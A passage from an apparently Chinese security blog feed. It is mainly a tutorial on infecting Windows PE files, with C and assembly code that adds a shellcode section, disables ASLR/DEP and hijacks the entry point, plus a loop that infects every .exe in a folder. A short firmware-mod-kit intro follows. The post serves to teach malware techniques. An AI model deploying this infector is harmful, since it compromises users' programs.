<h4 id="2）修改-NumberOfSection"><a href="#2）修改-NumberOfSection" class="headerlink" title="2）修改 NumberOfSection"></a><strong>2）修改 NumberOfSection</strong></h4><p>添加一个节表之后需要修改 IMAGE_FILE_HEADER 中的 NumberOfSection 字段，将节区数量由 4 改为 5。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/41073536.jpg" alt=""></p>
<h4 id="3）修改-SizeOfImage"><a href="#3）修改-SizeOfImage" class="headerlink" title="3）修改 SizeOfImage"></a><strong>3）修改 SizeOfImage</strong></h4><p>接着修改文件映像大小，即 IMAGE_OPTIONAL_HEADER 中的 SizeOfImage 字段，该字段按内存对齐方式对齐，在原大小（0x9000）的基础上加上新节区的大小（0x450），对齐后为 0xa000。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/28635670.jpg" alt=""></p>
<h4 id="4）添加节区数据"><a href="#4）添加节区数据" class="headerlink" title="4）添加节区数据"></a><strong>4）添加节区数据</strong></h4><p>最后添加新增节区的数据，把光标移到文件的末尾，点击 “编辑” / “插入数据”，插入数据大小为 1536(0x600)，使用 00 填充，点击确认，保存即可。</p>
<p>到此，已成功添加了一个节区，修改之后的程序仍是可运行的，使用 PEview 查看新增节区如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/90730788.jpg" alt=""></p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/63364761.jpg" alt=""></p>
<p>这里需要注意插入数据的大小要按磁盘对齐方式对齐，不然最终修改后的文件无法运行，并提示“该文件不是有效的 Win32 应用程序”。</p>
<h3 id="0x02-编程实现"><a href="#0x02-编程实现" class="headerlink" title="0x02 编程实现"></a><strong>0x02 编程实现</strong></h3><p>恶意代码为了实现其隐蔽性，在其感染 PE 文件时会将代码执行权交给被插入的代码，所以恶意代码通常会先被执行，执行完后再跳转至原 PE 文件中的代码继续执行。</p>
<p>添加节区主要通过内存映射文件和 PE 操作完成，将文件映射到内存中后可以通过内存指针方便地访问文件。下面主要介绍添加新节区的代码实现。</p>
<h4 id="1）将文件映射到内存"><a href="#1）将文件映射到内存" class="headerlink" title="1）将文件映射到内存"></a><strong>1）将文件映射到内存</strong></h4><p>首先用 CreateFile() 打开文件，然后使用 CreateFileMapping() 和 MapViewOfFile() 函数把文件映射到内存中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	HANDLE hFile = CreateFile(fpath,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( hFile  == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	HANDLE hMapFile = CreateFileMapping(hFile,<span class="literal">NULL</span>,PAGE_READWRITE,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (!hMapFile)&#123;</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	PVOID  pHdr = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (!pHdr)&#123;</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>CreateFileMapping() 函数定义如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">CreateFileMapping</span><span class="params">(</span></span></div><div class="line">	HANDLE                hFile,  <span class="comment">//handle to the file</span></div><div class="line">	LPSECURITY_ATTRIBUTES lpAttributes, <span class="comment">//pointer to SECURITY_ATTRIBUTES structure</span></div><div class="line">	DWORD                 flProtect,  <span class="comment">//page protection of the file mapping object</span></div><div class="line">	DWORD                 dwMaximumSizeHigh,</div><div class="line">	DWORD                 dwMaximumSizeLow,</div><div class="line">	LPCTSTR               lpName</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>MapViewOfFile() 函数定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFile</span><span class="params">(</span></span></div><div class="line">	HANDLE hFileMappingObject,  <span class="comment">//handle to a file mapping object</span></div><div class="line">	DWORD  dwDesiredAccess, <span class="comment">//type of access to a file mapping object</span></div><div class="line">	DWORD  dwFileOffsetHigh,</div><div class="line">	DWORD  dwFileOffsetLow,</div><div class="line">	SIZE_T dwNumberOfBytesToMap <span class="comment">//number of bytes of a file mapping to map to the view</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<h4 id="2）检查-PE-文件"><a href="#2）检查-PE-文件" class="headerlink" title="2）检查 PE 文件"></a><strong>2）检查 PE 文件</strong></h4><p>文件映射后要检查是否为有效的 PE 文件，同时为了避免重复感染，需要检查目标文件是否已被感染。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">// 判断是否为正常PE文件</span></div><div class="line">	<span class="keyword">if</span> (!IsPeFile(pHdr))&#123;</div><div class="line">		UnmapViewOfFile(pHdr);</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//判断是否已被感染</span></div><div class="line">	<span class="keyword">if</span> (IsInfected(pHdr))&#123;</div><div class="line">		UnmapViewOfFile(pHdr);</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>IsPeFile() 和 IsInfected() 函数的实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">检查是否为正常PE文件</div><div class="line">*/</div><div class="line"><span class="function">BOOL <span class="title">IsPeFile</span><span class="params">(PVOID pHdr)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="comment">//判断DOS头标志是否正确</span></div><div class="line">	IMAGE_DOS_HEADER *p1 = (IMAGE_DOS_HEADER*)pHdr;</div><div class="line">	<span class="keyword">if</span> (p1-&gt;e_magic != IMAGE_DOS_SIGNATURE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//判断PE头标志是否正确</span></div><div class="line">	IMAGE_NT_HEADERS*  p2 = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + p1-&gt;e_lfanew);</div><div class="line">	<span class="keyword">if</span> (p2-&gt;Signature != IMAGE_NT_SIGNATURE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">判断文件是否被感染</div><div class="line">*/</div><div class="line"><span class="function">BOOL <span class="title">IsInfected</span><span class="params">(PVOID pHdr)</span></span></div><div class="line">&#123;</div><div class="line">	IMAGE_DOS_HEADER *p = (IMAGE_DOS_HEADER*)pHdr;</div><div class="line">	<span class="comment">//判断DOS头的保留位是否已被填充为 0xABCD</span></div><div class="line">	<span class="keyword">if</span> ( p-&gt;e_res2[<span class="number">0</span>] == (WORD)INFECTFLAG)&#123;</div><div class="line">		<span class="keyword">return</span> TRUE;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		p-&gt;e_res2[<span class="number">0</span>] = (WORD)INFECTFLAG;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="3）添加节表"><a href="#3）添加节表" class="headerlink" title="3）添加节表"></a><strong>3）添加节表</strong></h4><p>添加一个节区需要在 PE 文件中添加一个节表，此外还需修改 NumberOfSections 和 SizeOfImage 字段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//PE头指针： 文件头指针+DOS头的e_lfanew位指定的PE头偏移</span></div><div class="line">	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + ((IMAGE_DOS_HEADER*)pHdr)-&gt;e_lfanew);</div><div class="line">	<span class="comment">//节区头指针： PE头指针+PE头的长度</span></div><div class="line">	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</div><div class="line"></div><div class="line">	<span class="comment">//两个对齐单位</span></div><div class="line">	DWORD dwFileAlign = pNTHdr-&gt;OptionalHeader.FileAlignment;</div><div class="line">	DWORD dwSecAlign  = pNTHdr-&gt;OptionalHeader.SectionAlignment;</div><div class="line">	<span class="comment">//最后一个节指针</span></div><div class="line">	IMAGE_SECTION_HEADER *pLastSec = &amp;pSecHdr[pNTHdr-&gt;FileHeader.NumberOfSections<span class="number">-1</span>];</div><div class="line">	<span class="comment">//定义一个新节</span></div><div class="line">	IMAGE_SECTION_HEADER *pNewSec = &amp;pSecHdr[pNTHdr-&gt;FileHeader.NumberOfSections];</div><div class="line">	<span class="comment">//原入口地址（OEP）</span></div><div class="line">	DWORD dwOldOEP = pNTHdr-&gt;OptionalHeader.AddressOfEntryPoint + pNTHdr-&gt;OptionalHeader.ImageBase;</div><div class="line">	<span class="comment">//需插入的代码长度</span></div><div class="line">	DWORD dwCodeSize  = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;</div><div class="line"></div><div class="line">	<span class="comment">//填充新节表的各字段</span></div><div class="line">	<span class="built_in">memcpy</span>(pNewSec-&gt;Name,<span class="string">".new"</span>,<span class="number">5</span>);</div><div class="line">	pNewSec-&gt;Misc.VirtualSize = dwCodeSize;</div><div class="line">	pNewSec-&gt;VirtualAddress		=	pLastSec-&gt;VirtualAddress + Align(pLastSec-&gt;Misc.VirtualSize, dwSecAlign);</div><div class="line">	pNewSec-&gt;SizeOfRawData		=	Align(dwCodeSize,dwFileAlign);</div><div class="line">	pNewSec-&gt;PointerToRawData	=	pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData;</div><div class="line">	pNewSec-&gt;Characteristics	=	IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;</div><div class="line"></div><div class="line">	<span class="comment">//节区数目加 1</span></div><div class="line">	pNTHdr-&gt;FileHeader.NumberOfSections++;</div><div class="line">	<span class="comment">//修正PE镜像大小</span></div><div class="line">	pNTHdr-&gt;OptionalHeader.SizeOfImage += Align(pNewSec-&gt;Misc.VirtualSize,dwSecAlign);</div><div class="line"> 	...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>VS2010 中默认设置时，计算 Shellcode 长度时无法正确获取函数在内存中的地址，需要将修改项目属性：配置属性/链接器/常规/关闭增量链接。</p>
<h4 id="4）插入节区数据"><a href="#4）插入节区数据" class="headerlink" title="4）插入节区数据"></a><strong>4）插入节区数据</strong></h4><p>病毒通常会将带有恶意行为的代码插入新节区的数据段，被插入的代码称为 Shellcode，这里只是插入一段弹消息框的代码，Shellcode 通常使用汇编实现，下面是内联汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">void __declspec(naked) ShellcodeStart()</div><div class="line">&#123;</div><div class="line">	__asm &#123;</div><div class="line">			pushad</div><div class="line">			call    routine</div><div class="line"></div><div class="line">	routine :</div><div class="line">			pop     ebp</div><div class="line">			sub      ebp, offset routine</div><div class="line">			push    0                                // MB_OK</div><div class="line">			lea       eax, [ebp + szCaption]</div><div class="line">			push    eax                              // lpCaption</div><div class="line">			lea	   eax, [ebp + szText]</div><div class="line">			push    eax                              // lpText</div><div class="line">			push    0                                // hWnd</div><div class="line">			mov     eax, 0xAAAAAAAA</div><div class="line">			call      eax                            // MessageBoxA</div><div class="line"></div><div class="line">			popad</div><div class="line">			push    0xBBBBBBBB                       // OEP</div><div class="line">			ret</div><div class="line"></div><div class="line">	szCaption :</div><div class="line">			db(&apos;V&apos;) db(&apos;i&apos;) db(&apos;r&apos;) db(&apos;u&apos;) db(&apos;s&apos;) db(0)</div><div class="line">	szText :</div><div class="line">			db(&apos;I&apos;) db(&apos;n&apos;) db(&apos;f&apos;) db(&apos;l&apos;) db(&apos;e&apos;) db(&apos;c&apos;) db(&apos;t&apos;) db(&apos; &apos;) db(&apos;s&apos;)</div><div class="line">			db(&apos;u&apos;) db(&apos;c&apos;) db(&apos;c&apos;) db(&apos;e&apos;) db(&apos;s&apos;) db(&apos;s&apos;) db(&apos; &apos;) db(&apos;!&apos;) db(0)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>从以上代码可知，Shellcode 执行完后会 ret 到原入口地址（OEP）处继续执行。Shellcode 中 MessageBoxA 函数的地址和 OEP 只是占位符，需要在运行时修正这两个地址。</p>
<p>大多数程序都会加载 user32.dll， 并且在同一系统中，user32.dll 会被加载到自身固有的 ImageBase，而 MessageBoxA 是该动态链接库的一个导出函数，所以同一系统中运行的所有进程的 MessageBoxA 函数地址是相同的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//动态获取 MessageBoxA 函数地址</span></div><div class="line">	HMODULE hModule = LoadLibraryA(<span class="string">"user32.dll"</span>);</div><div class="line">	LPVOID lpAddress = GetProcAddress(hModule, <span class="string">"MessageBoxA"</span>);</div><div class="line"></div><div class="line">	<span class="comment">//修改 shellcode 中 MessabeBoxA 和 OEP 的地址</span></div><div class="line">	HANDLE hHeap = HeapCreate(<span class="literal">NULL</span>,<span class="literal">NULL</span>,dwCodeSize);</div><div class="line">	LPVOID lpHeap = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwCodeSize);</div><div class="line">	<span class="built_in">memcpy</span>(lpHeap,ShellcodeStart,dwCodeSize);</div><div class="line"></div><div class="line">	DWORD dwIncrementor = <span class="number">0</span>;</div><div class="line">	<span class="keyword">for</span>(;dwIncrementor &lt; dwCodeSize; dwIncrementor++)&#123;</div><div class="line">		<span class="comment">//修改 MessageBoxA 地址</span></div><div class="line">		<span class="keyword">if</span>(*((LPDWORD)lpHeap + dwIncrementor) == <span class="number">0xAAAAAAAA</span>)&#123;</div><div class="line">			*((LPDWORD)lpHeap +dwIncrementor) = (DWORD)lpAddress;</div><div class="line">		&#125;</div><div class="line">		<span class="comment">//修改原 OEP 地址</span></div><div class="line">		<span class="keyword">if</span>(*((LPDWORD)lpHeap + dwIncrementor) == <span class="number">0xBBBBBBBB</span>)&#123;</div><div class="line">			*((LPDWORD)lpHeap +dwIncrementor) = dwOldOEP;</div><div class="line">			FreeLibrary(hModule);</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//复制shellcode到新节区</span></div><div class="line">	DWORD dwSize = <span class="number">0</span>;</div><div class="line">	SetFilePointer(hFile,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FILE_END);</div><div class="line">	WriteFile(hFile,lpHeap,pNewSec-&gt;SizeOfRawData,&amp;dwSize,<span class="literal">NULL</span>);</div><div class="line">	HeapFree(hHeap,<span class="literal">NULL</span>,lpHeap);</div><div class="line">	HeapDestroy(hHeap);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>修正 Shellcode 中地址之后将其复制到 PE 文件的末尾，首先使用 SetFilePointer() 函数将文件指针指向文件末尾，再通过 WriteFile() 函数将 Shellcode 函数写入文件。SetFilePointer() 函数定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">DWORD WINAPI <span class="title">SetFilePointer</span><span class="params">(</span></span></div><div class="line">	HANDLE hFile, <span class="comment">//A handle to the file</span></div><div class="line"> 	LONG   lDistanceToMove,</div><div class="line"> 	PLONG  lpDistanceToMoveHigh,</div><div class="line"> 	DWORD  dwMoveMethod <span class="comment">//The starting point for the file pointer move</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<h4 id="5）关闭目标程序-ASLR"><a href="#5）关闭目标程序-ASLR" class="headerlink" title="5）关闭目标程序 ASLR"></a><strong>5）关闭目标程序 ASLR</strong></h4><p>由于 Shellcode 中 MessageBoxA() 函数地址和原 OEP 都是硬编码的，而在 Windows Vista 系统开始都默认启用 ASLR，所以目标程序每次启动时加载到内存的地址(ImageBase)都不同，导致 Shellcode 在跳转至原入口地址时因地址错误而不能正常执行。</p>
<p>普通的 EXE 文件不存在 .reloc 节区，编译器默认情况下都启用 ASLR（“目属性/链接器/高级/随机基址” 可关闭 ASLR），所以编译生成的可执行文件会包含用于重定位的 .reloc 节区。PE 文件中与 ASLR 相关的字段主要有以下几个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">IMAGE_FILE_HEADER/Characteristics：关闭 ASLR 时才设置 IMAGE_FILE_RELOCS_STRIPPED 属性值    </div><div class="line">IMAGE_OPTIONAL_HEADER/DllCharacteristics：开启 ASLR 时才设置 IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 属性值</div><div class="line">IMAGE_OPTIONAL_HEADER/DataDirectory[5]：该字段为 Base Relocation Table，ASLR 关闭时该字段值为 0。</div></pre></td></tr></table></figure></p>
<p>下面通过编程的方式关闭目标程序的 ASLR：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//关闭目标程序 ASLR</span></div><div class="line">	pNTHdr-&gt;FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress = <span class="number">0</span>;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].Size = <span class="number">0</span>;</div><div class="line"> 	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>注：<br>IMAGE_OPTIONAL_HEADER/DllCharacteristics 中 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 为与 DEP 相关的属性值，开启 DEP 时会设置改属性值，同样可以用以下代码关闭目标程序的 DEP：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pNTHdr-&gt;OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;</div></pre></td></tr></table></figure></p>
<h4 id="6）修改入口地址-OEP"><a href="#6）修改入口地址-OEP" class="headerlink" title="6）修改入口地址 OEP"></a><strong>6）修改入口地址 OEP</strong></h4><p>为了让新添加节区中的代码获得优先执行权，要把程序的入口地址设置为新节区的起始地址，即新节表中 VirtualAddress 的值。修改完后调用 FlushViewOfFile() 函数将对文件的修改写入到磁盘中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line"> 	...</div><div class="line">	<span class="comment">//设置新增节区起始地址为新的入口地址</span></div><div class="line">	pNTHdr-&gt;OptionalHeader.AddressOfEntryPoint = pNewSec-&gt;VirtualAddress;</div><div class="line"></div><div class="line">	FlushViewOfFile(pHdr,pNTHdr-&gt;OptionalHeader.SizeOfHeaders);</div><div class="line">	UnmapViewOfFile(pHdr);</div><div class="line">	CloseHandle(hMapFile);</div><div class="line">	CloseHandle(hFile);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="6）测试"><a href="#6）测试" class="headerlink" title="6）测试"></a><strong>6）测试</strong></h4><p>以下代码遍历当前目录下所有.exe 文件，并感染除程序自身外的所有.exe文件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	WIN32_FIND_DATA FileInfo;</div><div class="line">	HANDLE hListFile;</div><div class="line">	TCHAR szFilePath[MAX_PATH];</div><div class="line">	TCHAR szCurrentPath[MAX_PATH];</div><div class="line">	TCHAR szCurrentModule[MAX_PATH];</div><div class="line"></div><div class="line">	<span class="comment">//获取当前目录</span></div><div class="line">	GetCurrentDirectory(MAX_PATH,szCurrentPath);</div><div class="line">	<span class="comment">//获取当前模块路径</span></div><div class="line">	GetModuleFileName(<span class="literal">NULL</span>,szCurrentModule,MAX_PATH);</div><div class="line">	lstrcpy(szFilePath,szCurrentPath);</div><div class="line">	lstrcat(szFilePath,<span class="string">L"\\*.exe"</span>);</div><div class="line"></div><div class="line">	<span class="comment">//遍历当前目录并感染除自身外的所有.exe文件</span></div><div class="line">	hListFile = FindFirstFile(szFilePath,&amp;FileInfo);</div><div class="line">	<span class="keyword">if</span>(hListFile == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">do</span>&#123;</div><div class="line">			<span class="keyword">if</span>(!_tcsstr(szCurrentModule,FileInfo.cFileName))&#123;</div><div class="line">				<span class="comment">//感染目标文件</span></div><div class="line">				<span class="keyword">if</span> (!InfectFile(FileInfo.cFileName))&#123;</div><div class="line">					<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;<span class="keyword">while</span>(FindNextFile(hListFile,&amp;FileInfo));</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行被感染后的文件，会弹出以下消息框，使用 PEview 可以看到添加了一个名为 .new 的节区。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-23/33815689.jpg" alt=""></p>
<p>完整代码可以在 <a href="https://github.com/0x4C43/InflectPE" target="_blank" rel="external">此链接</a> 下载。</p>
<hr>
<p>References:<br>[1] <a href="https://0x00sec.org/t/pe-file-infection/401" target="_blank" rel="external">PE File Infection</a><br>[2] 《小小黑客之路》<br>[3] 《黑客编辑揭秘与防范》<br>[4] 《逆向工程核心原理》</p>
]]></content>
      
        <categories>
            
            <category> Windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PE文件 </tag>
            
            <tag> 添加节区 </tag>
            
            <tag> 病毒感染 </tag>
            
            <tag> 打补丁 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用 firmware-mod-kit 修改固件]]></title>
      <url>/%E4%BD%BF%E7%94%A8firmware-mod-kit%E4%BF%AE%E6%94%B9%E5%9B%BA%E4%BB%B6/</url>
      <content type="html"><![CDATA[<p>firmware-mod-kit 工具包可用于提取固件中的文件系统，然后对其进行修改，并重新打包成固件。我们可以使用它对固件做定制化的修改，但是也有可能被恶意地用于在固件中添加后门等，所以在下载固件时应到官方网站下载，并检查固件是否被修改过。</p>
<p>该工具包支持以下固件：</p>
<blockquote>
<p>DD-WRT v23    tested - versions v23 SP1 and later are compatible (soon older versions too).<br>DD-WRT v24    tested<br>OpenWrt White Russian    tested<br>OpenWrt Kamikaze    untested (should work) - not really necessary, based on OpenWrt has its Image Builder.<br>FreeWrt    untested - should work ok<br>HyperWrt    untested<br>Ewrt    untested<br>Sveasoft Alchemy    untested<br>Sveasoft Talisman    untested<br>Linksys / other vendor    not supported by scripts yet - haven’t added cramfs handling<br>ASUS WL-330G    untested - should work ok<br>ASUS WL-520G    untested - should work ok<br>ASUS WL-530G    supported<br>ASUS WL-550G    untested  - should work ok<br>Trendnet TEW-632BRP    tested<br>DLink DIR-615    untested<br>many others*    untested</p>
</blockquote>
